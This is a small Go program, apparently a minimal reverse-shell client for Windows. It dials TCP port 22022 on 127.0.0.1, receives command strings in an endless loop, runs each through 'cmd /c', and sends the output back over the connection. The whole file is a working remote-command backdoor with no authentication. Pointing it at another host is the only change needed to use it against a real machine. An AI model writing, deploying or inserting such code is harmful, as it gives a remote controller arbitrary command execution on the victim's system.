package main

import (
	"fmt"
	"net"
	"os/exec"
)

func main() {
	// 配置客户端
	conn, err := net.Dial("tcp", "127.0.0.1:22022")
	if err != nil {
		fmt.Println("客户端创建失败:", err)
		return
	}

	defer conn.Close()

	for {
		buf := make([]byte, 4096)
		n, err := conn.Read(buf[:])
		if err != nil {
			fmt.Println("recv failed, err:", err)
			return
		}
		commend := string(buf[:n])
		fmt.Println("接收到数据:", commend)
		result := Exec(commend)

		conn.Write([]byte(result))
	}
}

func Exec(commend string) string {

	cmd := exec.Command("cmd", "/c", commend)
	out, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Println("命令执行失败", err)
	}
	fmt.Println(string(out))

	cmd.Wait()
	return string(out)
}


